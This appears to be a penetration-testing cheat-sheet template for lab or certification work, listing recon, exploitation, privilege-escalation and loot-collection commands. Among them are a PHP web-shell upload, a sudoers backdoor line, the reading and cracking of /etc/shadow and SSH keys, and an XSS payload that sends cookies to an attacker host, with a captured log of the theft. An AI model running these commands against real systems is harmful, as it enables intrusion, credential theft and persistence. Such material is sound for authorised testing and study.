## Info-sheet

- DNS-Domain name:
- Host name:
- OS:
- Server:
- Kernel:
- Workgroup:
- Windows domain:

Services and ports:
INSERTTCPSCAN

## Recon


```
Always start with a stealthy scan to avoid closing ports.

# Syn-scan
nmap -sS INSERTIPADDRESS

# Scan all ports, might take a while.
nmap INSERTIPADDRESS -p-

# Service-version, default scripts, OS:
nmap INSERTIPADDRESS -sV -sC -O -p 111,222,333

# Scan for UDP
nmap INSERTIPADDRESS -sU
unicornscan -mU -v -I INSERTIPADDRESS

# Connect to udp if one is open
nc -u INSERTIPADDRESS 48772

# Monster scan
nmap INSERTIPADDRESS -p- -A -T4 -sC
```


### Port 21 - FTP

- Name:
- Version:
- Anonymous login:

INSERTFTPTEST

```
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS

Syntax ftp $IP
```

### Port 22 - SSH

- Name:
- Version:
- Protocol:
- RSA-key-fingerprint:
- Takes-password:
If you have usernames test login with username:username
```
Syntax ssh username@$IP
```

INSERTSSHCONNECT

```
nc INSERTIPADDRESS 22
```

### Port 25

- Name:
- Version:
- VRFY:

INSERTSMTPCONNECT


```
nc -nvv INSERTIPADDRESS 25
HELO foo<cr><lf>

telnet INSERTIPADDRESS 25
VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
```

### Port 69 - UDP - TFTP

This is used for tftp-server.


### Port 110 - Pop3

- Name:
- Version:

INSERTPOP3CONNECT

```
telnet INSERTIPADDRESS 110
USER pelle@INSERTIPADDRESS
PASS admin

or:

USER pelle
PASS admin

# List all emails
list

# Retrieve email number 5, for example
retr 9
```

### Port 111 - Rpcbind

```
rpcinfo -p INSERTIPADDRESS
```


### Port 135 - MSRPC

Some versions are vulnerable.

### Port 143 - Imap

### Port 139/445 - SMB

- Name:
- Version:
- Domain/workgroup name:
- Domain-sid:
- Allows unauthenticated login:


```
nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smb-vuln-ms17-010.nse INSERTIPADDRESS -p 445


enum4linux -a INSERTIPADDRESS
rpcclient -U "" INSERTIPADDRESS
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

smbclient -L INSERTIPADDRESS
smbclient //INSERTIPADDRESS/tmp
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient //INSERTIPADDRESS/ipc$ -U john  
```


### Port 161/162 UDP - SNMP

```
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
snmp-check -t INSERTIPADDRESS -c public
```

```
# Common community strings
public
private
community
```


### Port 554 - RTSP


### Port 1030/1032/1033/1038

Used by RPC to connect in domain network.

## Port 1521 - Oracle

- Name:
- Version:
- Password protected:

```
tnscmd10g version -h INSERTIPADDRESS
tnscmd10g status -h INSERTIPADDRESS
```

### Port 2049 - NFS

```
showmount -e INSERTIPADDRESS

If you find anything you can mount it like this:

mount INSERTIPADDRESS:/ /tmp/NFS
mount -t INSERTIPADDRESS:/ /tmp/NFS
```

### Port 2100 - Oracle XML DB

- Name:
- Version:
- Default logins:

```
sys:sys
scott:tiger
```

Default passwords
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm


### 3306 - MySQL

- Name:
- Version:

```
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse INSERTIPADDRESS -p 3306

mysql --host=INSERTIPADDRESS -u root -p
```

### Port 3339 - Oracle web interface


- Basic info about web service (apache, nginx, IIS)
- Server:
- Scripting language:
- Apache Modules:
- IP-address:

### Port 80 - Web server

- Server:
- Scripting language:
- Apache Modules:
- IP-address:
- Domain-name address:


INSERTCURLHEADER

- Web application (ex, wordpress, joomla, phpmyadmin)
- Name:
- Version:
- Admin-login:


```
# Nikto
nikto -h http://INSERTIPADDRESS

# Nikto with squid proxy
nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444

# Get header
curl -i INSERTIPADDRESS

# Get everything
curl -i -L INSERTIPADDRESS

# Check for title and all links
curl INSERTIPADDRESS -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl INSERTIPADDRESS -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php

dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
```

#### Nikto scan


INSERTNIKTOSCAN


#### Url brute force

```
# Not recursive
dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt

# Gobuster - remove relevant responde codes (403 for example)
gobuster -u http://INSERTIPADDRESS -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
```
#### Dirb scan for webapps
```
#Settings
wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
file extensions=php, pl, sh, asp, html, json, py, cfm, aspx, rb, cgi

```

INSERTDIRBSCAN


#### Default/Weak login

Search documentation for default passwords and test them

```
site:webapplication.com password
```

```
admin admin
admin password
admin <blank>
admin <servicename>
root root
root admin
root password
root <servicename>
<username if you have> password
<username if you have> admin
<username if you have> username
username <servicename>
```


#### LFI/RFI




```
fimap -u "http://INSERTIPADDRESS/example.php?test="

# Ordered output
curl -s http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
/root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=
```

#### SQL-Injection

```
# Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
```

#### Sql-login-bypass

- Open Burp-suite
- Make and intercept a request
- Send to intruder
- Cluster attack.
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation

#### Wordpress
```
wpscan -u http://target --enumerate users
WordPress Admin Access: Appearance->Editor->404 Template for php
Navigate to TargetIP/wordpress/wp-content/themes/<name of theme>/404.php
```

### Password brute force - last resort

```
cewl
```

### Port 443 - HTTPS

Heartbleed:

```
# Heartbleed
sslscan INSERTIPADDRESS:443
```

## Vulnerability analysis

Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilites and features.

### To try - List of possibilies
Add possible exploits here:



### Find sploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```
site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```



----------------------------------------------------------------------------



'''''''''''''''''''''''''''''''''' PRIVESC '''''''''''''''''''''''''''''''''



-----------------------------------------------------------------------------



## Privilege escalation

Now we start the whole enumeration-process over gain.

- Kernel exploits
- Programs running as root
- Installed software
- Weak/reused/plaintext passwords
- Inside service
- Suid misconfiguration
- World writable scripts invoked by root
- Unmounted filesystems

Less likely

- Private ssh keys
- Bad path configuration
- Cronjobs


### To-try list

Here you will add all possible leads. What to try.


### Useful commands

```
#Metasploit
post/multi/recon/local_exploit_suggester

# Spawning shell
python -c 'import pty; pty.spawn("/bin/sh")'

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Set up webserver
cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080

# Download all files
wget http://192.168.1.101:8080/ -r; mv 192.168.1.101:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check

./LinEnum.sh -t -k password -r LinEnum.txt
python linprivchecker.py extended
./unix-privesc-check standard


# Writable directories
/tmp
/var/tmp


# Add user to sudoers
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
```
## Dirty COW
```
uname -a or uname -r
Works on Linux Kernel 2.6.22 < 3.9
Try 40839 or 40616 first
can also try the following if above & searchsploit doesnt work https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679 
```
### Basic info

- OS:
- Version:
- Kernel version:
- Architecture:
- Current user:

**Devtools:**
- GCC:
- NC:
- WGET:

**Users with login:**

```
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts

# Users with login
grep -vE "nologin" /etc/passwd

# Priv Enumeration Scripts


upload /unix-privesc-check
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./
upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./

python linprivchecker.py extended
./LinEnum.sh -t -k password
unix-privesc-check
```

### Kernel exploits

```
site:exploit-db.com kernel version

perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6

python linprivchecker.py extended
```

### Programs running as root

Look for webserver, mysql or anything else like that.

```
# Metasploit
ps

# Linux
ps aux
```

### Installed software

```
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```


### Weak/reused/plaintext passwords

- Check database config-file
- Check databases
- Check weak passwords

```
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext

```
./LinEnum.sh -t -k password
```

### Inside service

```
# Linux
netstat -anlp
netstat -ano
```

### Suid misconfiguration

Binary with suid permission can be run by anyone, but when they are run they are run as root!

Example programs:

```
nmap
vim
nano
```

```
find / -perm -u=s -type f 2>/dev/null
```


### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```
mount -l
```

### Cronjob

Look for anything that is owned by privileged user but writable for you

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### SSH Keys

Check all home directories

```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```


### Bad path configuration

Require user interaction





------------------------------------------------------------------------




----------------------------- LOOT LOOT LOOT LOOT ----------------------




------------------------------------------------------------------------


## Loot

**Checklist**

- Flags:
- Passwords and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:
- Mail:


### Passwords and hashes

```
cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### Dualhomed

```
ifconfig
ifconfig -a
arp -a
```

### Tcpdump

```
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X
tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

.ssh:
.bash_history
```

### Databases

### SSH-Keys

### Browser

### Mail

```
/var/mail
/var/spool/mail
```

### GUI
If there is a gui we want to check out the browser.

```
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```

------------------------------------------------------------------------




----------------------------- NOTES ------------------------------------




------------------------------------------------------------------------


## XSS


```
<script>alert("XSS")</script>

<script>
new Image().src="http://kali/bogus.php?output="+document.cookie;
</script>

root@kali:~# nc -nlvp 80
listening on [any] 80 ...
connect to [kali] from (UNKNOWN) [target] 49455
GET /bogus.php?output=PHPSESSID=CREDS HTTP/1.1
Accept: */*
Referer: http://127.0.0.1/index.php
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2;
.NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
Accept-Encoding: gzip, deflate
Host: 192.168.10.5
Connection: Keep-Alive
```
## Reverse

```
do all in vm
1) try to grab strings for low hanging fruit
2) sublime text
3) IDA Pro in windows is easiest (use ctrl+x to find references/calls to function)
4) N is the hotkey to rename a function in IDA Pro, semicolon is hotkey for comment
5) In immunity debugger view module (select app)
6) searh for all refeed text strings (double click on an error message & success (set breakpoints)
7) Dobule click in cpu for breakpoint
8) inspect jumps
9) modify jumps to not take errors
```

## Shell Spawning
```
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')

then to use normal linux commands like clear
export TERM=linux
```
## (From within IRB)
```
exec "/bin/sh"
(From within vi)
:!bash
```
## (From within vi)
```
:set shell=/bin/bash:shell
```
## (From within nmap)
```
!sh
```
## Command Injection
```
;
&&
|
||
...
```
## Password (Wordlists)
```
john --wordlist=test.txt --stdout --rules:Jumbo >> mutilated.txt
crunch 10 10 -t ,%Curtains -o ./worlist.curtains
```
## Password Cracking
```
Combine the provided passwd (passwd) and shadow (shadow)(shadow) and redirect them to a file (> unshadowed.txt)
unshadow passwd shadow > unshadowed.txt
john --wordlist=rockyou.txt --rules unshadowed.txt 


hashcat -D1 --force -m 7300 -a 0 -o cracked.txt /path/hash.txt /path/wordlist.txt
```
## Web Server
```
python -m SimpleHTTPServer 8000
```
## Quick Base64 Decoder
```
echo aGVsbG8gd2hpdGUgaGF0Cg== | base64 -d
```
## Break Restricted Shells
```
Recon of restricted shells: "env" command to see what the restricted shell path is
then echo /usr/local/rbin/* or ls -al /usr/local/rbin/*
once paths are listed, research each one to see options
export -p shows which variables are read only
```
## (VI or VIM Method)
```
Open a file and enter the following
:set shell=/bin/bash
:shell
or
:! /bin/bash
```
## (AWK Method)
```
awk 'BEGIN {system("/bin/sh")}'
```
## (Find Method)
```
find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```
## (More/Less/Man Method)
```
Type more, less, or man command with a file then try one of the following:
'! /bin/sh'
'!/bin/sh'
'!bash'
```
## (AWK Method)
```
a
```
## (Other Methods)
```
irb(main:001:0> exec "/bin/sh"
python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
also try the shell spawning methods above
```
## Metasploit Slow Search Fix
```
db_rebuild_cache
```
## SQLMap
```
sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
```
## Website redirects (put this in the html site vitcim is browsing)
```
<meta http-equiv="refresh" content="0; url=http://KaliIP:8080/" />
```
## How to replicate to gain access again:
